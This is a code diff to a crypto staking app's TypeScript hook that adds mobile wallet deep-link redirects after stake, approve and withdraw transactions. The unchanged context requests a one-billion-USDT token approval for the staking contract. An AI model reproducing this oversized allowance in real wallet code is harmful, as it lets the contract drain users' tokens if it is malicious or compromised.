@@ -1,5 +1,5 @@
 import { Contract, parseUnits, formatUnits, JsonRpcProvider, BrowserProvider } from 'ethers';
-import { useWallet } from '../lib/web3';
+import { useWallet, launchExternalLink } from '../lib/web3';
 
 const CONTRACT_ADDRESS = '0x56ACf536aBa0A122e2Da9d2C2D3Fdc14513A2436'; 
 const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955'; 
@@ -31,6 +31,16 @@ const ERC20_ABI = [
 
 const MIN_REQUIRED_ALLOWANCE = parseUnits("1000000", 18);
 const APPROVAL_AMOUNT = parseUnits("1000000000", 18); // 1 Billion USDT for hassle-free future stakes
+
+const WALLET_REDIRECT_LINKS: Record<string, string> = {
+    metamask: 'https://metamask.app.link/',
+    trust: 'https://link.trustwallet.com/',
+    safepal: 'https://link.safepal.io/',
+    tokenpocket: 'https://tokenpocket.github.io/deeplink',
+    binance: 'https://app.binance.com/cedefi/',
+    okx: 'https://www.okx.com/download',
+    bitget: 'https://web3.bitget.com/en'
+};
 
 export const getTierRate = (val: number) => {
     if (val >= 10000) return 0.12;
@@ -72,7 +82,7 @@ const callReadOnly = async <T>(fn: (contract: Contract) => Promise<T>, isUsdt = 
 };
 
 export function useStaking() {
-    const { address, isConnected, signer, walletProvider } = useWallet();
+    const { address, isConnected, signer, walletProvider, walletType } = useWallet();
 
     const getContract = async (withSigner = false) => {
         if (withSigner) {
@@ -134,7 +144,14 @@ export function useStaking() {
         const fee = await callReadOnly(async (contract) => {
             return await contract.stakeFee();
         });
-        const tx = await staking.stake(val, refAddress, { value: fee });
+        const txPromise = staking.stake(val, refAddress, { value: fee });
+
+        if (walletType && walletType !== 'injected') {
+            const redirectUrl = WALLET_REDIRECT_LINKS[walletType.toLowerCase()];
+            if (redirectUrl) launchExternalLink(redirectUrl);
+        }
+
+        const tx = await txPromise;
 
         console.log("[Staking] Transaction Sent:", tx.hash);
         return tx; // Return tx so components can wait for it
@@ -152,7 +169,14 @@ export function useStaking() {
         }
 
         const usdt = await getUsdtContract(true);
-        const tx = await usdt.approve(CONTRACT_ADDRESS, APPROVAL_AMOUNT);
+        const txPromise = usdt.approve(CONTRACT_ADDRESS, APPROVAL_AMOUNT);
+
+        if (walletType && walletType !== 'injected') {
+            const redirectUrl = WALLET_REDIRECT_LINKS[walletType.toLowerCase()];
+            if (redirectUrl) launchExternalLink(redirectUrl);
+        }
+
+        const tx = await txPromise;
         console.log("[Staking] Approval Transaction Sent:", tx.hash);
         await tx.wait(); // Wait for approval transaction to be mined
         return tx;
@@ -175,7 +199,14 @@ export function useStaking() {
     const withdraw = async (index: any, _unused?: any) => {
         const staking = await getContract(true);
         const i = typeof index === 'string' ? parseInt(index) : index;
-        const tx = await staking.withdraw(i);
+        const txPromise = staking.withdraw(i);
+
+        if (walletType && walletType !== 'injected') {
+            const redirectUrl = WALLET_REDIRECT_LINKS[walletType.toLowerCase()];
+            if (redirectUrl) launchExternalLink(redirectUrl);
+        }
+
+        const tx = await txPromise;
         return await tx.wait();
     };
 
